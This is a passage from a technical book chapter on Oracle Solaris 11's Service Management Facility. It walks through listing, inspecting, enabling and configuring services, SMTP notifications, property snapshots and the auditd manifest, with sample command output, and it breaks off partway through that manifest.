<html><head></head><body>
<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05" class="calibre1"/>Chapter 5. Playing with Oracle Solaris 11 Services</h1></div></div></div><p class="calibre7">In this chapter, we will cover:</p><div><ul class="itemizedlist"><li class="listitem">Reviewing SMF operations</li><li class="listitem">Handling manifests and profiles</li><li class="listitem">Creating SMF services</li><li class="listitem">Administering inetd-controlled network services</li><li class="listitem">Troubleshooting Oracle Solaris 11 services</li></ul></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_1"><a id="ch05lvl1sec63" class="calibre1"/>Introduction</h1></div></div></div><p class="calibre7">Oracle Solaris 11 presents the <strong class="calibre8">Service Management Facility</strong> (<strong class="calibre8">SMF</strong>) as a main feature. This framework is responsible for administrating and monitoring all services and applications. SMF was introduced in Oracle Solaris 10, and it <a id="id776" class="calibre1"/>offers several possibilities that make our job easier by being<a id="id777" class="calibre1"/> responsible for several tasks, such as the following:</p><div><ul class="itemizedlist"><li class="listitem">Starting, stopping, and restarting services</li><li class="listitem">Monitoring services</li><li class="listitem">Discovering all service dependencies</li><li class="listitem">Troubleshooting services</li><li class="listitem">Providing an individual log for each available service</li></ul></div><p class="calibre7">Usually, there are many services in each system, and they are organized by category, such as system, network, device, and application. Usually, a service only has an instance named default. However, a service can present more than one instance (for example, there can be more than one Oracle instance and more than one configured network interface, and this difference is highlighted in the reference to the service. This reference is called<a id="id778" class="calibre1"/> <strong class="calibre8">Fault Management Resource Identifier</strong> (<strong class="calibre8">FMRI</strong>), which looks like <code class="email">svc:/system/cron:default</code>, where:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">svc</code>: This is a native service from SMF</li><li class="listitem"><code class="email">system</code>: This is the service category</li><li class="listitem"><code class="email">cron</code>: This is the service name</li><li class="listitem"><code class="email">default</code>: This is the instance</li></ul></div><p class="calibre7">The main daemon that's responsible for the administration of all the SMF services is <code class="email">svc.startd</code> and it is called during system initialization when reading the configuration file, <code class="email">/etc/inittab</code>, as follows:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">more /etc/inittab</strong>
 <strong class="calibre8">(truncated output)</strong>
ap::sysinit:/usr/sbin/autopush -f /etc/iu.ap
<strong class="calibre8">smf::sysinit:/lib/svc/bin/svc.startd  &gt;/dev/msglog 2&lt;&gt;/dev/msglog &lt;/dev/console</strong>
p3:s1234:powerfail:/usr/sbin/shutdown -y -i5 -g0 &gt;/dev/msglog 2&lt;&gt;/dev/msglog
root@solaris11-1:~#</pre></div><p class="calibre7">Another goal of <code class="email">svc.startd</code> is to ensure that the system reaches the appropriate milestone, that is, a status or level where a group of services are online, which are very similar to old run-level states. The important milestones are single-user (run-level S), multi-user (run-level 2), and multi-user server (run-level 3):</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -a | grep milestone</strong>
online         21:54:11 svc:/milestone/unconfig:default
online         21:54:11 svc:/milestone/config:default
online         21:54:12 svc:/milestone/devices:default
online         21:54:23 svc:/milestone/network:default
online         21:54:25 svc:/milestone/name-services:default
online         21:54:25 svc:/milestone/single-user:default
online          0:54:52 svc:/milestone/self-assembly-complete:default
online          0:54:59 svc:/milestone/multi-user:default
online          0:55:00 svc:/milestone/multi-user-server:default</pre></div><p class="calibre7">There're two special milestones, as follows:</p><div><ul class="itemizedlist"><li class="listitem"><strong class="calibre8">all</strong>: This is the default milestone where all services are initialized</li><li class="listitem"><strong class="calibre8">none</strong>: No service is initialized—which can be used during an Oracle Solaris 11 maintenance</li></ul></div><p class="calibre7">Based on the previous information, it's important to know the correct initialization order, as shown:</p><div><ul class="itemizedlist"><li class="listitem"><strong class="calibre8">Boot loader</strong>: The root filesystem<a id="id779" class="calibre1"/> archive is loaded from disk to memory</li><li class="listitem"><strong class="calibre8">Booter</strong>: The boot archive (it's a RAM disk image very similar to <code class="email">initramfs</code> from Linux and <a id="id780" class="calibre1"/>contains all the files required to boot the system) is loaded in the memory and is executed. The boot loader is a service:<div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -a | grep boot-archive</strong>
online         21:53:51 svc:/system/boot-archive:default
online          0:54:51 svc:/system/boot-archive-update:default</pre></div></li></ul></div><p class="calibre7">Any <code class="email">boot-archive</code> maintenance operation must be done by the <code class="email">bootadm</code> command.</p><div><ul class="itemizedlist"><li class="listitem"><strong class="calibre8">Ram disk</strong>: The kernel is<a id="id781" class="calibre1"/> extracted from the boot archive and is executed.</li><li class="listitem"><strong class="calibre8">Kernel</strong>: A small root filesystem is mounted and, from there, important drivers are loaded. Afterwards, the<a id="id782" class="calibre1"/> true root filesystem is mounted, the remaining drivers are loaded, and the <code class="email">/sbin/init</code> script is executed.</li><li class="listitem"><strong class="calibre8">Init</strong>: The <code class="email">/sbin/init</code> script <a id="id783" class="calibre1"/>reads the <code class="email">/etc/inittab</code> file, and the <code class="email">svc.started</code> daemon is executed.</li><li class="listitem"><strong class="calibre8">svc.started</strong>: This starts SMF services and their related processes. All service configurations <a id="id784" class="calibre1"/>are read (through the <code class="email">svc.configd</code> daemon) from the main service database named <code class="email">repository.db</code>, which is located in <code class="email">/etc/svc</code> together with its respective backups.</li></ul></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05lvl1sec64" class="calibre1"/>Reviewing SMF operations</h1></div></div></div><p class="calibre7">Administering<a id="id785" class="calibre1"/> services in Oracle Solaris 11 is very simple because there are few commands with an intuitive syntax. Therefore, the main purpose of this<a id="id786" class="calibre1"/> section is to review the operational part of the SMF administration.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch05lvl2sec96" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">This recipe requires a virtual machine (VirtualBox or VMware) with Oracle Solaris 11 installed and 4 GB RAM.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch05lvl2sec97" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">When an administrator is responsible for managing services in Oracle Solaris 11, the most important and common task is to list the existing services. This operation can be done by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -a | more</strong>
STATE          STIME    FMRI
legacy_run      0:54:59 lrc:/etc/rc2_d/S47pppd
legacy_run      0:54:59 lrc:/etc/rc2_d/S89PRESERVE
disabled       21:53:34 svc:/system/device/mpxio-upgrade:default
disabled       21:53:35 svc:/network/install:default
disabled       21:53:36 svc:/network/ipsec/ike:default
<strong class="calibre8">(truncated output)</strong>
online         21:53:34 svc:/system/early-manifest-import:default
online         21:53:34 svc:/system/svc/restarter:default
online         21:53:41 svc:/network/socket-config:default
<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">The <code class="email">svcs</code> command has the goal of listing the existing services, and when the <code class="email">-a</code> option is specified, we are interested in listing all the services.</p><p class="calibre7">From the preceding<a id="id787" class="calibre1"/> output, the following useful information is obtained:</p><div><ul class="itemizedlist"><li class="listitem">The <code class="email">legacy_run</code> state is a label for legacy services, which wasn't converted to the SMF framework. Other possible statuses are as follows:<div><ul class="itemizedlist1"><li class="listitem"><code class="email">online</code>: This means that the service is running</li><li class="listitem"><code class="email">disabled</code>: This means that the service is not running</li><li class="listitem"><code class="email">offline</code>: This means that the service is enabled, but it's either not running or not available to run</li><li class="listitem"><code class="email">initialized</code>: This means that the service is starting up</li><li class="listitem"><code class="email">degraded</code>: This means that the service is running, but with limited features working</li><li class="listitem"><code class="email">maintenance</code>: This means that the service isn't running because of a configuration problem</li></ul></div></li><li class="listitem">The <code class="email">STIME</code> field shows the time when the service was started</li><li class="listitem"><code class="email">FMRI</code> is the alias object that references the service</li></ul></div><p class="calibre7">SMF in Oracle Solaris 11 does an excellent job when we have to find the service dependencies of a service (the <code class="email">-d</code> option) and discover which services are dependent on this service (the <code class="email">-D</code> option). Some examples are as follows:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -a | grep auditd</strong>
online          0:54:55 svc:/system/auditd:default
root@solaris11-1:~# <strong class="calibre8">svcs -d svc:/system/auditd:default</strong>
STATE          STIME    FMRI
online         21:54:25 svc:/milestone/name-services:default
online         21:54:40 svc:/system/filesystem/local:default
online          0:54:53 svc:/system/system-log:default
root@solaris11-1:~# <strong class="calibre8">svcs -D svc:/system/auditd:default</strong>
STATE          STIME    FMRI
disabled       21:53:48 svc:/system/console-login:terma
disabled       21:53:49 svc:/system/console-login:termb
online          0:54:55 svc:/system/console-login:default
online          0:54:56 svc:/system/console-login:vt2
online          0:54:56 svc:/system/console-login:vt6
online          0:54:56 svc:/system/console-login:vt3
online          0:54:56 svc:/system/console-login:vt5
online          0:54:56 svc:/system/console-login:vt4
online          0:54:59 svc:/milestone/multi-user:default</pre></div><p class="calibre7">Another good <a id="id788" class="calibre1"/>method to find the dependencies of a service is to use the <code class="email">svc</code> command, as follows:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -l svc:/system/auditd:default</strong>
fmri         svc:/system/auditd:default
name         Solaris audit daemon
enabled      true
<strong class="calibre8">state        online</strong>
next_state   none
state_time   March  5, 2014 00:43:41 AM BRT
logfile      /var/svc/log/system-auditd:default.log
restarter    svc:/system/svc/restarter:default
contract_id  <strong class="calibre8">115</strong> 
manifest     /lib/svc/manifest/system/auditd.xml
<strong class="calibre8">dependency</strong>   require_all/none svc:/system/filesystem/local (online)
<strong class="calibre8">dependency</strong>   require_all/none svc:/milestone/name-services (online)
<strong class="calibre8">dependency</strong>   optional_all/none svc:/system/system-log (online)</pre></div><p class="calibre7">From the previous output, some good information is obtained, such as knowing that the service is enabled (<code class="email">online</code>); it has three service dependencies (as shown in the <code class="email">svcs –d</code> command); and finding their respective logfiles (<code class="email">/var/svc/log/system-auditd:default.log</code>), which could be examined using <code class="email">more /var/svc/log/system-auditd:default.log</code>.</p><p class="calibre7">There's good information to learn about the <code class="email">contract_id</code> attribute (<code class="email">115</code>) by running the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">ctstat -i 115 -v</strong>
CTID    ZONEID  TYPE    STATE   HOLDER  EVENTS  QTIME   NTIME   
115     0       process owned   11      0       -       -       
  cookie:                0x20
  informative event set: none
  critical event set:    hwerr empty
  fatal event set:       none
  parameter set:         inherit regent
  member processes:      944
  inherited contracts:   none
  service fmri:          svc:/system/auditd:default
  service fmri ctid:     115
  creator:               svc.startd
  aux:                   start
root@solaris11-1:~#</pre></div><p class="calibre7">The associated process ID from <code class="email">auditd</code> is <code class="email">944</code>, and this service was initialized by the <code class="email">svc.startd</code> daemon. Additionally, the same information about the process ID can be found by running the following command using a short form of FMRI:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -p auditd</strong>
STATE          STIME    FMRI
online          0:54:55 svc:/system/auditd:default
                0:54:55      <strong class="calibre8">944 auditd</strong>
</pre></div><p class="calibre7">A short form<a id="id789" class="calibre1"/> of FMRI is a unique sequence that makes it possible to distinguish this service from others, and this short form always refers to the default instance of the specified service.</p><p class="calibre7">A good <code class="email">svcs</code> command parameter to troubleshoot a service is as follows:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -x auditd</strong>
svc:/system/auditd:default (Solaris audit daemon)
 State: <strong class="calibre8">online</strong> since March  2, 2014 12:54:55 AM BRT
   See: auditd(1M)
   See: audit(1M)
   See: auditconfig(1M)
   See: audit_flags(5)
   See: audit_binfile(5)
   See: audit_syslog(5)
   See: audit_remote(5)
   See: <strong class="calibre8">/var/svc/log/system-auditd:default.log</strong>
Impact: None.</pre></div><p class="calibre7">If there's any service that was already configured, it should be running. However, if it isn't or it's preventing other services from running, we can find out the reason by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -xv</strong>
</pre></div><p class="calibre7">The previous command output doesn't show anything, but there could have been some broken services. At end of the chapter, we'll come back to this issue.</p><p class="calibre7">So far, all the tasks were focused on collecting information about a service. Our next step is to learn how<a id="id790" class="calibre1"/> to administer them using the <code class="email">svcadm</code> command. The available options for this command are as follows:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">svcadm enable &lt;fmri&gt;</code>: This will enable a service</li><li class="listitem"><code class="email">svcadm enable –r &lt;fmri&gt;</code>: This will enable a service recursively and its dependencies</li><li class="listitem"><code class="email">svcadm disable &lt;fmri&gt;</code>: This will disable a service</li><li class="listitem"><code class="email">svcadm disable –t &lt;fmri&gt;</code>: This will disable a service temporarily (the service will be enabled in the next boot)</li><li class="listitem"><code class="email">svcadm restart &lt;fmri&gt;</code>: This will restart a service</li><li class="listitem"><code class="email">svcadm refresh &lt;fmri&gt;</code>: This will read the configuration file of a service again</li><li class="listitem"><code class="email">svcadm clear &lt;fmri&gt;</code>: This will bring a service from the maintenance state to the online state</li><li class="listitem"><code class="email">svcadm mark maintenance &lt;fmri&gt;</code>: This will put a service in the maintenance state</li></ul></div><p class="calibre7">A few examples are shown as follows:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">svcadm disable auditd</strong>
root@solaris11-1:/# <strong class="calibre8">svcs -a | grep auditd</strong>
disabled       20:33:12 svc:/system/auditd:default
root@solaris11-1:/# <strong class="calibre8">svcadm enable auditd</strong>
root@solaris11-1:/# <strong class="calibre8">svcs -a | grep auditd</strong>
online         20:33:35 svc:/system/auditd:default</pre></div><p class="calibre7">SMF also supports a notification feature using SMTP service and SNMP trap. To enable and configure this feature (using SMTP), it is necessary to install the notification package, and this task can be executed by running the following command:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">pkg install smtp-notify</strong>
</pre></div><p class="calibre7">With the <code class="email">smtp-notify</code> package installed, we can enable and configure any service to mail messages to <code class="email">root@localhost</code> if its status changes from online to maintenance, as shown below:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">svcadm enable smtp-notify</strong>
root@solaris11-1:/# <strong class="calibre8">svcs -a | grep smtp-notify</strong>
online         20:29:07 svc:/system/fm/smtp-notify:default
root@solaris11-1:~# <strong class="calibre8">svccfg -s svc:/system/fm/smtp-notify:default setnotify -g from-online,to-maintenance mailto:root@localhost</strong>
</pre></div><p class="calibre7">To check whether the notification service is appropriately configured for all services, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs –n</strong>
Notification parameters for FMA Events
    Event: problem-diagnosed
        Notification Type: <strong class="calibre8">smtp</strong>
            Active: true
            reply-to: root@localhost
            to: root@localhost

        Notification Type: snmp
            Active: true

        Notification Type: syslog
            Active: true

    Event: problem-repaired
        Notification Type: snmp
            Active: true

    Event: problem-resolved
        Notification Type: snmp
            Active: true
System wide notification parameters:
svc:/system/svc/global:default:
    Event: <strong class="calibre8">to-maintenance</strong>
        Notification Type: smtp
            Active: true
            to: root@localhost

    Event: <strong class="calibre8">from-online</strong>
        Notification Type: smtp
            Active: true
            to: root@localhost</pre></div><p class="calibre7">Finally, if we<a id="id791" class="calibre1"/> verify the root mailbox, we'll see the result from our configuration:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">mail</strong>
From noaccess@solaris11-1.example.com Sun Mar  2 20:29:05 2014
Date: Sun, 2 Mar 2014 05:17:28 -0300 (BRT)
From: No Access User &lt;noaccess@solaris11-1.example.com&gt;
Message-Id: &lt;201403020817.s228HSRC006537@solaris11-1.example.com&gt;
Subject: Fault Management Event: solaris11-1:SMF-8000-YX
To: root@solaris11-1.example.com
Content-Length: 791

SUNW-MSG-ID: SMF-8000-YX, TYPE: defect, VER: 1, SEVERITY: major
EVENT-TIME: Sun Mar  2 05:17:23 BRT 2014
PLATFORM: VirtualBox, CSN: 0, HOSTNAME: solaris11-1
SOURCE: software-diagnosis, REV: 0.1
EVENT-ID: acfbe77f-47fc-6e3b-835a-9005dc8ec70c
DESC: A service failed - a method is failing in a retryable manner but too often.
AUTO-RESPONSE: The service has been placed into the maintenance state.
IMPACT: svc:/system/zones:default is unavailable.
REC-ACTION: Run 'svcs -xv svc:/system/zones:default' to determine the generic reason why the service failed, the location of any logfiles, and a list of other services impacted. Please refer to the associated reference document at http://support.oracle.com/msg/SMF-8000-YX for the latest service procedures and policies regarding this diagnosis.</pre></div><p class="calibre7">A service in <a id="id792" class="calibre1"/>Oracle Solaris 11 has several properties and all of them can be viewed by using the <code class="email">svcprop</code> command, as follows:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">svcprop auditd</strong>
preselection/flags astring lo
preselection/naflags astring lo
preselection/read_authorization astring solaris.smf.value.audit
preselection/value_authorization astring solaris.smf.value.audit
queuectrl/qbufsz count 0
queuectrl/qdelay count 0
queuectrl/qhiwater count 0
queuectrl/qlowater count 0
<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">If we want to check a specific property from the audit service, we have to execute the following command:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">svcprop -p audit_remote_server/login_grace_time auditd</strong>
30</pre></div><p class="calibre7">If we go further, it's possible to interact (read and write) with the properties from the service through the <code class="email">svccfg</code> command:</p><div><pre class="programlisting">root@solaris11-1:/# <strong class="calibre8">svccfg</strong> 
svc:&gt;</pre></div><p class="calibre7">The first step is to list all available services by running the following sequence of commands:</p><div><pre class="programlisting">svc:&gt; <strong class="calibre8">list</strong>
application/cups/scheduler
application/cups/in-lpd
smf/manifest
application/security/tcsd
application/management/net-snmp
<strong class="calibre8">(truncated output)</strong>

svc:&gt; <strong class="calibre8">select auditd</strong>
svc:/system/auditd&gt; <strong class="calibre8">list</strong>
:properties
default</pre></div><p class="calibre7">While selecting the <code class="email">auditd</code> service, there're two possibilities—to list the general properties of a service<a id="id793" class="calibre1"/> or to list the private properties of its <code class="email">default</code> instance. Thus, to list its general properties, execute the following command:</p><div><pre class="programlisting">svc:/system/auditd&gt; <strong class="calibre8">listprop</strong>
usr                          dependency         
usr/entities                 fmri        svc:/system/filesystem/local
usr/grouping                 astring     require_all
usr/restart_on               astring     none
<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">Listing properties from the default instance is done by running the following commands:</p><div><pre class="programlisting">svc:/system/auditd:default&gt; <strong class="calibre8">select auditd:default</strong>
svc:/system/auditd:default&gt; <strong class="calibre8">listprop</strong>
preselection                        application
preselection/flags                  astring     lo
preselection/naflags                astring     lo
preselection/read_authorization     astring   solaris.smf.value.audit
preselection/value_authorization    astring   solaris.smf.value.audit
queuectrl                           application
<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">It's feasible to list and change any service's property by running the following commands:</p><div><pre class="programlisting">svc:/system/auditd:default&gt; <strong class="calibre8">listprop audit_remote/p_timeout</strong>
audit_remote/p_timeout count       5
svc:/system/auditd:default&gt; <strong class="calibre8">setprop audit_remote/p_timeout=10</strong>
svc:/system/auditd:default&gt; <strong class="calibre8">listprop audit_remote/p_timeout</strong>
audit_remote/p_timeout count       10</pre></div><p class="calibre7">Many times, during a reconfiguration, the properties of a service can get changed to another non-default value and eventually this service could present problems and go to the maintenance state because of this new configuration. Then, how do we restore the old values of the properties?</p><p class="calibre7">To fix the problem, we could return all values from the properties of this service to their default values. This task<a id="id794" class="calibre1"/> can be executed by using the automatic snapshot (a kind of backup) by SMF. Therefore, execute the following commands:</p><div><pre class="programlisting">svc:/system/auditd:default&gt; <strong class="calibre8">revert start</strong>
svc:/system/auditd:default&gt; <strong class="calibre8">listprop audit_remote/p_timeout</strong>
audit_remote/p_timeout count       5
svc:/system/auditd:default&gt; <strong class="calibre8">unselect</strong>
svc:/system/auditd&gt; <strong class="calibre8">unselect</strong>
svc:&gt; <strong class="calibre8">exit</strong>
root@solaris11-1:~#</pre></div><p class="calibre7">The available snapshots are as follows:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">running</code>: This snapshot is taken every time the <code class="email">svcadm</code> refresh is run</li><li class="listitem"><code class="email">start</code>: This snapshot is taken at the last successful start</li><li class="listitem"><code class="email">initial</code>: This snapshot is taken during the first import of the manifest</li></ul></div><p class="calibre7">An SMF manifest is an XML file that describes a service, a set of instances, and their respective properties. When a manifest is imported, all its configurations (including their properties) are loaded in the service configuration repository. The default location of a manifest is the <code class="email">manifest</code> directory under <code class="email">/lib/svc/</code>.</p><p class="calibre7">Another interesting and related task is to learn how to change the environment variables of a service. The following example shows us the value from the <code class="email">TZ</code> property that will be changed to Brazil/East:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">pargs -e `pgrep -f /usr/sbin/auditd`</strong>
937:  /usr/sbin/auditd
envp[0]: _=*11*/usr/sbin/auditd
envp[1]: LANG=en_US.UTF-8
envp[2]: LC_ALL=
envp[3]: LC_COLLATE=
envp[4]: LC_CTYPE=
envp[5]: LC_MESSAGES=
envp[6]: LC_MONETARY=
envp[7]: LC_NUMERIC=
envp[8]: LC_TIME=
envp[9]: PATH=/usr/sbin:/usr/bin
envp[10]: PWD=/root
envp[11]: SHLVL=2
envp[12]: SMF_FMRI=svc:/system/auditd:default
envp[13]: SMF_METHOD=start
envp[14]: SMF_RESTARTER=svc:/system/svc/restarter:default
envp[15]: SMF_ZONENAME=global
envp[16]: TZ=localtime
envp[17]: A__z="*SHLVL</pre></div><p class="calibre7">Thus, in order<a id="id795" class="calibre1"/> to change and check the value of the <code class="email">TZ</code> property from the <code class="email">auditd</code> service, execute the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svccfg -s svc:/system/auditd:default setenv TZ Brazil/East</strong>
root@solaris11-1:~# <strong class="calibre8">svcadm refresh svc:/system/auditd:default</strong>
root@solaris11-1:~# <strong class="calibre8">svcadm restart svc:/system/auditd:default</strong>
root@solaris11-1:~# <strong class="calibre8">pargs -e `pgrep -f /usr/sbin/auditd`</strong>
7435:  /usr/sbin/auditd
envp[0]: _=*11*/usr/sbin/auditd
envp[1]: LANG=en_US.UTF-8
envp[2]: LC_ALL=
envp[3]: LC_COLLATE=
envp[4]: LC_CTYPE=
envp[5]: LC_MESSAGES=
envp[6]: LC_MONETARY=
envp[7]: LC_NUMERIC=
envp[8]: LC_TIME=
envp[9]: PATH=/usr/sbin:/usr/bin
envp[10]: PWD=/root
envp[11]: SHLVL=2
envp[12]: SMF_FMRI=svc:/system/auditd:default
envp[13]: SMF_METHOD=start
envp[14]: SMF_RESTARTER=svc:/system/svc/restarter:default
envp[15]: SMF_ZONENAME=global
envp[16]: TZ=Brazil/East
envp[17]: A__z="*SHLVL</pre></div><p class="calibre7">There is one last good trick to find out the properties that were changed in the SMF configuration repository:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svccfg -s auditd listcust -L</strong>
start/environment              astring     admin       TZ=Brazil/East</pre></div><div><div><div><div><h3 class="title2"><a id="ch05lvl3sec47" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">In this section, you<a id="id796" class="calibre1"/> learned the fundamentals of SMF as well as how to administer SMF services using <code class="email">svcs</code> and <code class="email">svcadm</code>. We have also configured the notification service to log (using the SMTP service) any interesting event such as changing the status of services. In the end, the <code class="email">svcprop</code> and <code class="email">svccfg</code> commands were used to get and see the service's properties as well as the snapshot feature (the <code class="email">listsnap</code> and <code class="email">revert</code> subcommands) from <code class="email">svccfg</code> that was used to rollback all the properties to their default values.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05lvl1sec65" class="calibre1"/>Handling manifests and profiles</h1></div></div></div><p class="calibre7">When handling SMF services, almost every service configuration is focused on two key concepts: profiles and<a id="id797" class="calibre1"/> manifests. The following recipe teaches you about the<a id="id798" class="calibre1"/> details.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch05lvl2sec98" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">This recipe requires a virtual machine (VirtualBox or VMware) running Oracle Solaris 11 and with a 4 GB RAM.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch05lvl2sec99" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">As we have explained previously, an SMF manifest is an XML file that describes a service, a set of instances, and their properties. When a manifest is imported, its entire configuration (including its properties) is loaded in the service configuration repository. This import operation can be enforced, potentially loading new configurations in the repository, by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcadm restart svc:/system/manifest-import:default</strong>
</pre></div><p class="calibre7">The default location of the manifest is the <code class="email">manifest</code> directory under <code class="email">/lib/svc/</code>, as follows:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">cd /lib/svc/manifest/</strong>
root@solaris11-1:/lib/svc/manifest# <strong class="calibre8">ls –l</strong>
total 27
drwxr-xr-x  10 root     sys           17 Dec 23 18:41 application
drwxr-xr-x   2 root     sys            2 Sep 19  2012 device
drwxr-xr-x   2 root     sys           10 Dec 23 18:54 milestone
drwxr-xr-x  16 root     sys           53 Jan 17 07:23 network
drwxr-xr-x   2 root     sys            2 Sep 19  2012 platform
drwxr-xr-x   2 root     sys            2 Sep 19  2012 site
drwxr-xr-x   8 root     sys           73 Dec 23 18:55 system
root@solaris11-1:/lib/svc/manifest# <strong class="calibre8">cd application/</strong>
root@solaris11-1:/lib/svc/manifest/application# <strong class="calibre8">ls –l</strong>
total 92
-r--r--r--   1 root     sys         3464 Sep 19  2012 coherence.xml
-r--r--r--   1 root     sys         6160 Sep 19  2012 cups.xml
drwxr-xr-x   2 root     sys           11 Dec 23 18:41 desktop-cache
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 font
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 graphical-login
-r--r--r--   1 root     sys         1762 Sep 19  2012 man-index.xml
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 management
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 opengl
drwxr-xr-x   2 root     sys            7 Dec 23 18:41 pkg
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 security
-r--r--r--   1 root     sys         2687 Sep 19  2012 stosreg.xml
-r--r--r--   1 root     sys         1579 Sep 19  2012 texinfo-update.xml
-r--r--r--   1 root     sys         9013 Sep 19  2012 time-slider-plugin.xml
-r--r--r--   1 root     sys         4469 Sep 19  2012 time-slider.xml
drwxr-xr-x   2 root     sys            5 Dec 23 18:41 x11</pre></div><p class="calibre7">According to the<a id="id799" class="calibre1"/> output, service manifests are categorized as:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">application</code></li><li class="listitem"><code class="email">device</code></li><li class="listitem"><code class="email">milestone</code></li><li class="listitem"><code class="email">network</code></li><li class="listitem"><code class="email">platform</code></li><li class="listitem"><code class="email">site</code></li><li class="listitem"><code class="email">system</code>.</li></ul></div><p class="calibre7">The previous output <a id="id800" class="calibre1"/>has listed all the application manifests as an example and, as we will learn, manifests play a very important role in the configuration of a service. For example, it would be nice to study the <code class="email">audit.xml</code> manifest to learn the details. Therefore, this study will be done as follows:</p><div><pre class="programlisting">root@solaris11-1:/lib/svc/manifest# <strong class="calibre8">cd system/</strong>
root@solaris11-1:/lib/svc/manifest/system# <strong class="calibre8">cat auditd.xml</strong>
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1"&gt;
&lt;!--
 Copyright (c) 2005, 2012, Oracle and/or its affiliates. All rights reserved.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
--&gt;

<strong class="calibre8">&lt;service_bundle type='manifest' name='SUNWcsr:auditd'&gt;</strong>

<strong class="calibre8">&lt;service</strong>
  <strong class="calibre8">name='system/auditd'</strong>
  <strong class="calibre8">type='service'</strong>
  version='1'&gt;

  &lt;single_instance /&gt;

  <strong class="calibre8">&lt;dependency</strong>
    name='usr'
    type='service'
    grouping='require_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/system/filesystem/local' /&gt;
  <strong class="calibre8">&lt;/dependency&gt;</strong>

  <strong class="calibre8">&lt;dependency</strong>
    name='ns'
    type='service'
    grouping='require_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/milestone/name-services' /&gt;
  <strong class="calibre8">&lt;/dependency&gt;</strong>

  <strong class="calibre8">&lt;dependency</strong>
    name='syslog'
    type='service'
    grouping='optional_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/system/system-log' /&gt;
  <strong class="calibre8">&lt;/dependency&gt;</strong>

  <strong class="calibre8">&lt;dependent</strong>
    name='multi-user'
    grouping='optional_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/milestone/multi-user'/&gt;
  <strong class="calibre8">&lt;/dependent&gt;</strong>

  <strong class="calibre8">&lt;dependent</strong>
    name='console-login'
    grouping='optional_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/system/console-login'/&gt;
  <strong class="calibre8">&lt;/dependent&gt;</strong>

  <strong class="calibre8">&lt;exec_method</strong>
    type='method'
    <strong class="calibre8">name='start'</strong>
    exec='/lib/svc/method/svc-auditd'
    timeout_seconds='60'&gt;
    &lt;method_context&gt;
      &lt;method_credential user='root' group='root' /&gt;
    &lt;/method_context&gt;
  <strong class="calibre8">&lt;/exec_method&gt;</strong>

  <strong class="calibre8">&lt;exec_method</strong>
    type='method'
    <strong class="calibre8">name='refresh'</strong>
    exec='/lib/svc/method/svc-auditd'
    timeout_seconds='30'&gt;
    &lt;method_context&gt;
      &lt;method_credential user='root' group='root' /&gt;
    &lt;/method_context&gt;
  <strong class="calibre8">&lt;/exec_method&gt;</strong>

  &lt;!--
    auditd waits for c2audit to quiet down after catching a -TERM
    before exiting; auditd's timeout is 20 seconds
  --&gt;

  <strong class="calibre8">&lt;exec_method</strong>
    type='method'
    <strong class="calibre8">name='stop'</strong>
    exec=':kill -TERM'
